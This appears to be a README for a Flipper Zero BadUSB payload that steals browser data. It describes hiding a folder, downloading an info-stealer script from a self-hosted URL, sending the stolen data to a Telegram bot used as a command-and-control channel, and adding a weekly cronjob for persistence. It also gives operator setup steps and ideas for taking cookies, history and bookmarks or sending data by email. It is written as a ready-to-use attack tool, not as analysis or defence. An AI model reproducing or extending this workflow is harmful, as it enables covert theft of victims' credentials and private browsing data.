# Browser Data Exfiltration

**Process**
  1. Creates a hidden folder to prepare data for extract.
  2. Downloads the info stealer script.
  3. Sends the browser data via Telegram (C2 channel).
  4. Creates a cronjob to get data every week.
   
**Dependencies**
  1. Telegram

**What you need to do**
  1. Change `<your_chat_id>` in `browserdata.sh` to your Telegram chat ID.
  2. Change `<your_bot_id>` in `browserdata.sh` to your Telegram bot ID.
  3. Change `https://your.domain.com/browserdata.sh` in `browserdata.txt` to the link where your shell script is hosted.
  4. Transfer `browserdata.txt` to your FlipperZero device.
  
**How can you modify this?**
  1. Gather more browser data, e.g., cookies, history, bookmarks, etc.
  2. Use email or cloud storage instead of Telegram.
  3. Change the cronjob frequency ([cronjob translator](https://crontab.guru/)).
